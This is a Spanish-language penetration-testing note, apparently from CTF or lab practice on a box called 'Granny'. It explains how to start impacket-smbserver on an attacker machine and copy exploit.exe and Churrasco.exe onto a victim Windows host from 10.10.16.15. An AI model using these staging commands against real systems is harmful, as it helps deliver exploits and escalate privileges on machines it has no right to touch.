#impacket-smbserver

---

Nos sirve para levantar un servidor [[smb]] y pasarnos archivos a la maquina victima

----
# Comandos

#### Maquina que vamos a usar como host
```
impacket-smbserver NombreDeCarpeta $(pwd) -smb2support

Ejemplo: impacket-smbserver smbfolder $(pwd) -smb2support
```
*Parametros:*
	`NombreDeLaCarpeta` Es el nombre de la carpeta del servidor, se le puede poner cualquier nombre
	`$(pwd)` Es para especificar que vamos a estar compartiendo la carpeta actual de trabajo
	`-smb2support` Sirve para que sea compatible a versiones viejas de [[smb]]


#### Maquina desde la cual vamos a descargar los archivos

```
copy \\Ip\NombreDeLaCarpeta\Archivo .

Ejemplo: copy \\10.10.16.15\smbfolder\exploit.exe .
```
*Parametros:*
	`NombreDeLaCarpeta` Es el nombre el cual pusimos a la carpeta cuando creamos el servidor con el primer comando
	`Archivo` Es el nombre del archivo que queremos descargar
	`.` Es para espeficiar que lo vamos a descargar en el directorio actual de trabajo y que se va a mantener el nombre original del archivo

----
### Ejemplo practico


Desde nuestra maquina de atacante, donde tenemos el ejecutable del [[Churrasco.exe]] vamos a levantar un [[impacket-smbserver]] con el comando `impacket-smbserver smbfolder $(pwd) -smb2support`
![[Granny18.png]]

Vamos a crear una carpeta llamada */tmp* en *C:* para poder tener permisos de escritura sin ningun tipo de problemas
Y desde la maquina victima vamos a descargar los archivos con `copy \\10.10.16.15\smbfolder\exploit.exe .` y `copy \\10.10.16.15\smbfolder\churrasco.exe .`